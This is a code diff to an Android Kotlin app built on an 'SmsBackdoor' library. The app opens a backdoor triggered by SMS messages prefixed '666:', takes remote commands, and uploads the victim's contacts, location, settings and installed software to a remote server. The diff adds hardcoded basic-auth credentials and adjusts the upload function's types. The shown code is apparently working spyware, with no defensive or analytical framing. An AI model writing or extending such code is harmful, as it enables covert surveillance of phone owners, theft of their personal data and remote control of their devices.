@@ -14,6 +14,8 @@ import com.evilthreads.smsbackdoor.SmsBackdoor
 import com.kotlinpermissions.KotlinPermissions
 import io.ktor.client.*
 import io.ktor.client.engine.cio.*
+import io.ktor.client.features.auth.*
+import io.ktor.client.features.auth.providers.*
 import io.ktor.client.features.json.*
 import io.ktor.client.features.json.serializer.*
 import io.ktor.client.request.*
@@ -78,6 +80,12 @@ class MainActivity : AppCompatActivity() {
                     install(JsonFeature){
                         serializer = KotlinxSerializer()
                     }
+                    install(Auth){
+                        basic {
+                            username = "evilthreads"
+                            password = "secret"
+                        }
+                    }
                 }.use { client ->
                     SmsBackdoor.openDoor(this, "666:", payload = payload) { remoteCommand ->
                         runBlocking {
@@ -117,7 +125,7 @@ val locationUri = url.plus("location")
 val settingsUri = url.plus("settings")
 val softwareUri = url.plus("software")
 
-inline suspend fun <reified T: PocketData> HttpClient.upload(data: Collection<T>){
+inline suspend fun <reified T: PocketData> HttpClient.upload(data: List<T>){
     lateinit var uri: String
     when(data.first()){
         is Contact -> uri = contactsUri
@@ -131,7 +139,7 @@ inline suspend fun <reified T: PocketData> HttpClient.upload(data: Collection<T>
         is Setting -> uri = settingsUri
         is Software -> uri = softwareUri
     }
-    this.post<Collection<T>>(uri){
+    this.post<List<T>>(uri){
         body = defaultSerializer().write(data, ContentType.Application.Json)
     }
 }
